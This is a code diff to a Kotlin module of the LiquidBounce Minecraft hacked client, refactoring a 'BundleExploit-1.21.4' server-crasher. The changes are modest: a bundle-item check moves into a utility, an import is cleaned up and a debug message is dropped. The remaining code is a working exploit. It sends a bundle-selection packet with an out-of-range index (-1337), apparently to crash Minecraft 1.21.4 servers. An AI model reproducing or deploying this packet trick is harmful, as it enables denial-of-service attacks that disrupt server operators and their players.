+++ src/main/kotlin/net/ccbluex/liquidbounce/features/module/modules/exploit/servercrasher/exploits/Bundle1214Exploit.kt
@@ -7,35 +7,10 @@ import net.ccbluex.liquidbounce.utils.client.chat
 import net.ccbluex.liquidbounce.utils.client.markAsError
 import net.ccbluex.liquidbounce.utils.inventory.HotbarItemSlot
 import net.ccbluex.liquidbounce.utils.inventory.interactItem
+import net.ccbluex.liquidbounce.utils.item.isBundle
 import net.minecraft.component.DataComponentTypes
-import net.minecraft.item.Item
-import net.minecraft.item.Items
+import net.minecraft.network.packet.c2s.play.BundleItemSelectedC2SPacket
 import org.apache.commons.lang3.math.Fraction
-
-
-private val BUNDLE_ITEMS = setOf(
-    Items.BUNDLE,
-    Items.WHITE_BUNDLE,
-    Items.ORANGE_BUNDLE,
-    Items.MAGENTA_BUNDLE,
-    Items.LIGHT_BLUE_BUNDLE,
-    Items.YELLOW_BUNDLE,
-    Items.LIME_BUNDLE,
-    Items.PINK_BUNDLE,
-    Items.GRAY_BUNDLE,
-    Items.LIGHT_GRAY_BUNDLE,
-    Items.CYAN_BUNDLE,
-    Items.PURPLE_BUNDLE,
-    Items.BLUE_BUNDLE,
-    Items.BROWN_BUNDLE,
-    Items.GREEN_BUNDLE,
-    Items.RED_BUNDLE,
-    Items.BLACK_BUNDLE
-)
-
-private fun Item.isBundle(): Boolean {
-    return this in BUNDLE_ITEMS
-}
 
 /**
  * Bundle Exploit
@@ -52,26 +27,21 @@ object Bundle1214Exploit : Choice("BundleExploit-1.21.4") {
 
     override fun enable() {
         val slot = HotbarItemSlot(player.inventory.selectedSlot)
-        val item = slot.itemStack
-
-        if (!item.item.isBundle()
-            || item.get(DataComponentTypes.BUNDLE_CONTENTS)?.occupancy?.equals(Fraction.ZERO) == true
-            ) {
+        val itemStack = slot.itemStack
+        if (!itemStack.isBundle ||
+            itemStack.get(DataComponentTypes.BUNDLE_CONTENTS)?.occupancy?.equals(Fraction.ZERO) == true) {
             chat(markAsError(ModuleServerCrasher.message("bundleExploit.notBundle")))
             ModuleServerCrasher.enabled = false
             return
         }
 
-        chat(item.name.toString())
         val slotIdx = slot.getIdForServerWithCurrentScreen()
             ?: 36
-
         val selected = -1337 // anything below -1 will work
-        val packet = net.minecraft.network.packet.c2s.play.BundleItemSelectedC2SPacket(slotIdx, selected)
+        val packet = BundleItemSelectedC2SPacket(slotIdx, selected)
         network.sendPacket(packet)
 
         interactItem(hand = slot.useHand)
-
         ModuleServerCrasher.enabled = false
     }
